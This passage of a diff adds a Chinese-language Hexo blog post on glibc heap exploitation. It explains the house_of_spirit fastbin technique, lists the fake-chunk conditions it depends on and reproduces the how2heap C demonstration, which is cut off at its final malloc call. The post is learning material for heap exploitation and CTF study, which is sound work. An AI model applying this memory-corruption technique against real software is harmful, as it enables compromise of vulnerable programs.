class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>不曾设想的道路</p>
+<p>double free的利用方式是修改fd指向fake_chunk,这个house_of_spirit是先伪造fake chunk,然后让一个指针指向这个堆，假设这个指针为a，然后free(a),fake_chunk就进入了bin了，然后再申请fake_chunk大小的堆就申请到了fake_chunk,然后就可以往这个堆里写入数据。</p>
+<p>但这个利用方式也有限制条件</p>
+<ul>
+<li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li>
+<li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li>
+<li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li>
+<li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>（64位是8字节，32位是4字节），同时也不能大于<code>av-&gt;system_mem</code> （没查到）。</li>
+<li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li>
+</ul>
+<p>最主要的就是next_chunk-&gt;size的绕过。</p>
+<p>可以通过how2heap体会利用过程</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()</span><br><span class="line">&#123;</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">	malloc(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">	unsigned long long *a;</span><br><span class="line">	// This has nothing to do <span class="keyword">with</span> fastbinsY (do <span class="keyword">not</span> be fooled by the <span class="number">10</span>) - fake_chunks <span class="keyword">is</span> just a piece of memory to fulfil allocations (pointed to <span class="keyword">from</span> fastbinsY)</span><br><span class="line">	unsigned long long fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, sizeof(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accommodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">	fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; // this <span class="keyword">is</span> the size</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        // fake_chunks[<span class="number">9</span>] because <span class="number">0x40</span> / sizeof(unsigned long long) = <span class="number">8</span></span><br><span class="line">	fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; // nextsize</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">	a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">	free(a);</span><br><span class="line"></span><br><span class="line">	fprintf(stderr, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">	fprintf(stderr, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, malloc(<span class="number">0x30</span>));</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/11/12/unlink/" rel="prev" title="unlink">
+      <i class="fa fa-chevron-left"></i> unlink
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Fastbin-Attack"><span class="nav-number">1.</span> <span class="nav-text">Fastbin Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Fastbin-Double-Free"><span class="nav-number">1.1.</span> <span class="nav-text">Fastbin Double Free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#house-of-spirit"><span class="nav-number">1.2.</span> <span class="nav-text">house_of_spirit</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">rootzhang</p>
+  <div class="site-description" itemprop="description">我的博客</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">8</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">rootzhang</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
